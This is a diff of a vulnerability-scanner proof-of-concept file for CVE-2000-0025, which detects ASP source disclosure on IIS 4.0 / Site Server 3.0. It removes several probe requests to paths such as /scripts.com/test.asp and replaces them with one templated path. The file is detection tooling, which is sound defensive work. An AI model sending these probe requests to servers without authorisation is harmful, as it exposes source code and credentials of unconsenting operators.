@@ -1,15 +1,10 @@
 [info]
-author = "AVE"
-description = "通过向IIS 4.0及Site Server 3.0中包含 .com/.exe/.sh/.cgi/.dll 扩展名的虚拟目录路径请求ASP文件，检测服务器是否返回ASP脚本源码而非执行结果。若响应包含 <% 等ASP代码标记，则确认存在此信息泄露漏洞。攻击者无需认证即可通过网络远程读取ASP源代码，获取数据库连接字符串、业务逻辑等敏感信息。"
+author = "ave"
+description = "检测 IIS 4.0 / Site Server 3.0 虚拟目录命名漏洞，通过包含扩展名（如 .com）的虚拟目录路径请求 ASP 文件，验证是否返回 ASP 源代码而非执行结果"
 id = "POC-AVE-2000-0024"
-name = "Microsoft IIS 4.0 / Site Server 3.0 虚拟目录命名ASP源码泄露验证"
+name = "CVE-2000-0025 PoC"
 severity = "medium"
-tags = [
-    "cve-2000-0025",
-    "iis",
-    "information-disclosure",
-    "asp",
-]
+tags = ["ave-2000-0024"]
 vuln_id = [
     "CVE-2000-0025",
     "AVE-2000-0024",
@@ -20,52 +15,12 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/scripts.com/test.asp"
+path = "/{{BaseURL}}/vdir.com/test.asp"
 protocol = "http"
 
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["<%"]
-
-[[poc.requests]]
-method = "GET"
-path = "/iisadmin.exe/test.asp"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["<%"]
-
-[[poc.requests]]
-method = "GET"
-path = "/cgi-bin.sh/test.asp"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["<%"]
-
-[[poc.requests]]
-method = "GET"
-path = "/iissamples.dll/test.asp"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["<%"]
-
-[[poc.requests]]
-method = "GET"
-path = "/_vti_bin.com/test.asp"
-protocol = "http"
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
